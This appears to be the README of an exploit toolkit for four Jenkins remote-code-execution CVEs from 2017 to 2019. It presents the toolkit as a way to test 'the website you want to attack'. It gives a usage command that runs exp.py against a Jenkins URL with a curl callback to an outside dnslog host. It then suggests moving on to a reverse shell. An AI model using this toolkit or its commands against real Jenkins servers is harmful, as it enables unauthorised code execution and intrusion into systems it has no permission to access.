# Jenkins-Rce-2017-2018-2019



- ## Introduction

     There are four CVEs in this project ,which includes CVE-2017-1000353,CVE-2018-1000861, CVE-2019-1003005 and CVE-2019-1003029. It means you can use this project to test if the website you want to attack  has these Jenkins vulnerabilities. You can try curl online dnslog platform firstly to test it. If it works, you can do further operations,such as reverse shell and so on.

  

- ## The environment this project needed 

  1. Java

  2. python 2.7 (exp.py needed)

  3. python 3.5 (exploit.py needed)

     

- ## Useage:

```
py -2  exp.py http://jenkins/ 'curl 123.dnslog.cn'
```

**Annotation:**  You should use python 2.7 to run exp.py firstly, and then it will invoke other scripts to automatically test these vulnerabilities.

### References:

https://github.com/orangetw/awesome-jenkins-rce-2019
https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2017-1000353

